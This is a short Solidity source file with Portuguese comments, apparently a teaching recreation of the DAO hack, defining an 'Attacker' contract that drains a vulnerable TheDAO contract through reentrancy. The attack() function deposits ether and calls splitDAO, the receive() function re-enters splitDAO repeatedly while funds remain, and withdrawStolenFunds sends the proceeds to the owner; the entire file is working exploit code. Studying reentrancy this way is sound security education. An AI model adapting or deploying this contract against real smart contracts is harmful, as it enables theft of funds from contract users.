// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheDAO.sol";

contract Attacker {
    TheDAO public dao;
    address public owner;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _daoAddress) {
        dao = TheDAO(_daoAddress);
        owner = msg.sender;
    }

    // Função para iniciar o ataque
    function attack() external payable {
        require(msg.value >= AMOUNT, "Precisa de ETH para investir primeiro");
        
        // 1. Investir na DAO para ter saldo legítimo inicial
        dao.deposit{value: AMOUNT}();

        // 2. Chamar a função vulnerável pela primeira vez
        dao.splitDAO();
    }

    // O "fallback" ou "receive" é acionado quando a DAO envia Ether para este contrato
    receive() external payable {
        // Verifica se a DAO ainda tem dinheiro para roubar (pelo menos mais 1 ether)
        if (address(dao).balance >= AMOUNT) {
            // REENTRÂNCIA: Chama splitDAO novamente!
            // Como o saldo na DAO ainda não foi zerado (está na linha "balances[msg.sender] = 0"),
            // a DAO acha que ainda temos crédito e envia dinheiro de novo.
            dao.splitDAO();
        }
    }

    // Função para o atacante sacar o lucro para sua carteira
    function withdrawStolenFunds() external {
        payable(owner).transfer(address(this).balance);
    }
}